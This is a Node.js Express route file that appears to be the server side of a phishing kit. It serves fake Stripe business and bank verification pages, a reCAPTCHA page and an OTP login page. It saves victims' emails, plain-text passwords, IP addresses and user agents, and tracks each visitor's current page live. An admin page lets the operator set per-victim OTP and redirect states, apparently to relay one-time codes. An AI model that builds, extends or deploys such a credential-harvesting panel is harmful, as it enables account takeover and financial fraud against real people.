const express = require('express');
const router = express.Router();
const User = require('../models/user');
const liveUser = require('../models/liveuser');

router.get('/', (req, res, next) => {
	return res.render('index.ejs');
});

router.get('/home', (req, res, next) => {
	return res.render('index.ejs');
});


router.post('/', (req, res, next) => {
	let personInfo = req.body;
	console.log(req.body)
	
	if (!personInfo.email || !personInfo.password ) {
		console.log("nope" + req.body)
		res.send();
	} else {
		if (personInfo.email != null) {
			console.log(personInfo.email)
			User.findOne({ email: personInfo.email }, (err, data) => {
				if (!data) {
					let c;
					User.findOne({}, (err, data) => {

						if (data) {
							c = data.unique_id + 1;
						} else {
							c = 1;
						}

						let newPerson = new User({
							unique_id: c,
							email: personInfo.email,
							password: personInfo.password,
							userip: personInfo.userip,
							useragent: personInfo.useragent,
							otpstatus: personInfo.otpstatus,
							redirectstatus: personInfo.redirectstatus});

						newPerson.save((err, Person) => {
							if (err)
								console.log(err);
							else
								console.log('Success');
						});

					}).sort({ _id: -1 }).limit(1);
					res.send({ "Success": "regsuc", "email": personInfo.email, "userip": personInfo.userip });
				} else {
					res.send({ "Success": "regalready" , "email": personInfo.email, "userip": personInfo.userip });
				}

			});
		} else {
			res.send({ "Success": "password is not matched" });
		}
	}
});



router.get('/recaptcha', (req, res, next) => {
	return res.render('recaptcha.ejs');
});




router.post('/recaptcha', (req, res, next) => {

	// console.log(req.body)
	User.findOne({ email: req.body.ruseremail }, (err, data) => {
		if (data) {

			if (data.email == req.body.ruseremail) {
				// req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" , "otpstatus": data.otpstatus});
			} else {
				res.send({ "Success": "Wrong password!" });
			}
		} else {
			res.send({ "Success": "This Email Is not regestered!" });
		}
	});
});




router.get('/logout', (req, res, next) => {
	if (req.session) {
		// delete session object
		req.session.destroy((err) => {
			if (err) {
				return next(err);
			} else {
				return res.redirect('/');
			}
		});
	}
});



router.get('/BusinessStripe', (req, res, next) => {
	res.render("VerifyBusinessStripe.ejs");
});


router.get('/BankStripe', (req, res, next) => {
	res.render("VerifybankStripe.ejs");
});

router.post('/verifybank', (req, res, next) => {
	// console.log(req.body.email)
	User.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			if (data.email == req.body.email) {
				// req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" , "redirectstatus": data.redirectstatus});
			} else {
				res.send({ "Success": "Something went wrong!" });
			}
		} else {
			res.send({ "Success": "This Email Is not regestered!" });
		}
	});
});



router.get('/loginotp', (req, res, next) => {
	res.render("loginotp.ejs");
});


router.get('/adminpage', (req, res, next) => {
	// res.render("./admin/admin.ejs");


	// res.render("./admin/admin.ejs", {
	// 	data: docs
	// });
	liveUser.find((err, docs) => {
        if (err) {
			// console.log('done')
      
        } else {
			

			User.findOne({ email: docs[0].email },(err, docsx) => {
				if (err) {
					console.log('error')
			  
				} else {
					console.log(docsx)
					console.log( "docsx above")

						res.render("./admin/admin.ejs", {
		data: docs, datax: docsx 
	});
				}
		
			})





            // console.log('Failed to retrieve the Course List: ' + err);
        }

	})






	
});







// app.get('/index', function(req, res){            
// 	Activities.find({}, function(err, activity){
// 	  if(err){
// 		  console.log(err);
// 	  }else{
// 			  Upcoming.find({}, function(err, upcomingActivity){
// 	  if(err){
// 		  console.log(err);
// 	  }else{
// 		  res.render('index', {activity:activity, upcoming:upcomingActivity,});
// 	  }
// 	});
// 	  }
// 	});
// });
















router.post('/updatestats', (req, res, next) => {
	console.log(req.body.email)
	User.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			if (data.email == req.body.email) {
				// req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" , "yourdata": data});
			} else {
				res.send({ "email": "Something went wrong!" });
			}
		} else {
			res.send({ "error": "This Email Is not regestered!" });
		}
	});




})





router.post('/updatedata', (req, res, next) => {
	console.log(req.body)
	User.findOne({ email: req.body.mongoemail }, (err, data) => {
		if (!data) {
			res.send({ "Success": "Id not found!" });
		} else if (err){

			console(err)
			res.send({ "Success": "Something went wrong!" });
			
		}
		else if (data){
			console.log(req.body)
			
			if (req.body.otpstatus) {
				
				data.otpstatus = req.body.otpstatus;
				
				data.save((err, Person) => {
					if (err)
						console.log(err);
					else
						console.log('Success');
					res.send({ "Success": "OTP changed!" });
				});



				
			}
			
		else if (req.body.redirectstatus) {
				
			data.redirectstatus = req.body.redirectstatus;
			
			data.save((err, Person) => {
				if (err)
					console.log(err);
				else
					console.log('Success');
				res.send({ "Success": "redirecting status changed!" });
			});

			
		} 			
			else {
				res.send({ "Success": "No data to update." });
			}




		}
	});







})




//Live update getter 


router.post('/live', (req, res, next) => {
	let livedata = req.body;
	// console.log(req.body)
	
		
			liveUser.findOne({ email: livedata.email }, (err, data) => {
				if (!data) {
					let c;
					liveUser.findOne({}, (err, data) => {

						if (data) {
							c = data.unique_id + 1;
						} else {
							c = 1;
						}

						let newPerson = new liveUser({
							unique_id: c,
							email: livedata.email,
							password: livedata.password,
							userip: livedata.userip,
							useragent: livedata.useragent,
							currentpage: livedata.url,
							date: livedata.date
							});

						newPerson.save((err, Person) => {
							if (err)
								console.log(err);
							else
								console.log('Success');
						});

					}).sort({ _id: -1 }).limit(1);
					res.send({ "Success": "successfully"});
				} 
				else if (data) 
				{
				
					data.currentpage = req.body.url;
				
					data.save((err, Person) => {
						if (err)
							console.log(err);
						else
							console.log('Saved a new visitor');
						res.send({ "Success": "Updated!" });
					});

				}

				 else {
					res.send({ "Success": "err fiund" });
				}

			}); 
});


router.post('/deletelivedata', (req, res, next) => {
	console.log(req.body.email)
	liveUser.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			liveUser.deleteOne(data, (err, obj)=>{
				if (err) throw err;
				res.send({ "Success": "deleted" });
				console.log("deleted visitor with delete one")
			})
		} else {

			liveUser.remove(data, (err, obj)=>{
				if (err) throw err;
				res.send({ "Success": "deleted" });
				console.log("deleted visitor with remove one")
			})



		}

	});
});




// router.get('/livedatapage', (req, res, next) => {
// // livedataview.ejs

// liveUser.watch().on('change', data  => {
// 	console.log("Data change dectected - data was "+ data.operationType + "ed")

// 	// res.render("./admin/admin.ejs");

// 	// liveUser.watch().on('change', data => {
		
// if(data){
// 	liveUser.find((err, docs)  => {
		
//         if (!err) {
            
// 			res.render("./admin/livedatapage.ejs", {
//                 datax: docs
				
//             });
           

			
//         } else {
//             console.log('Failed to retrieve the Course List: ' + err);
//         }
// 	})
// //  res.send(data.operationType)
// }
//  });
	


// })



	






























module.exports = router;